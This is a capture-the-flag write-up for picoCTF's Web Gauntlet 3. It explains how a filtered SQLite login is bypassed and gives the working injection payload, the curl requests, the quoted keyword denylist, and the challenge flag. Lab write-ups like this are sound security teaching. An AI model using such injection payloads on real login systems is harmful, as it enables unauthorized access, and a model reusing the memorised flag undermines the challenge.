# Web Gauntlet 3

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{k3ep_1t_sh0rt_d0339730}`

## Summary

Identical filtered-SQLite login as [Web Gauntlet 2](../Web%20Gauntlet%202/writeup.md), just with
a tighter combined-input-length cap (25 characters instead of 35). The same 18-character bypass
already satisfies the new limit, so no new technique was needed.

## Discovery

`filter.php` shows the same denylist as challenge 2 (`or and true false union like = > < ; --
/* */ admin`, plus the undocumented `password`), and the challenge description states the new
length cap directly: "Only 25 characters this time."

## Proof of Concept

```
curl -s -c cookies.txt -X POST "http://TARGET/index.php" \
  --data-urlencode "user=adm'||'in" \
  --data-urlencode "pass=' IS 0+'x"
```

This reuses the exact Gauntlet 2 payload:

- `adm'||'in` as the username closes the app's string early, concatenates two fragments with
  `||` so the literal substring `admin` never appears in the request, and reassembles to
  `username='admin'`.
- `' IS 0+'x` as the password closes its string immediately (`password=''`, deterministically
  false), then uses SQLite's `IS` in place of the blocked `=`, and adds a throwaway string that
  arithmetically coerces to `0`, forging `password='' IS 0+'x'` → always true, without ever
  referencing the (also filtered) word `password`.

Combined length: 18 characters, under the new 25-character cap. Response:

```
Congrats! You won! Check out filter.php
```

The win state is tracked in the session, so revisiting `filter.php` with the same cookie dumps
its own source (`highlight_file()`), which contains the flag:

```
curl -s -b cookies.txt "http://TARGET/filter.php"
```

```
picoCTF{k3ep_1t_sh0rt_d0339730}
```

## Root Cause

Same as Web Gauntlet 2: denylist filtering over raw request text instead of parameterized
queries. Shrinking the length budget doesn't address the underlying flaw when the bypass was
already well under the new limit.

## CWE / OWASP

- **CWE-89**: SQL Injection
- **CWE-184**: Incomplete List of Disallowed Inputs
- **OWASP A03:2021**: Injection
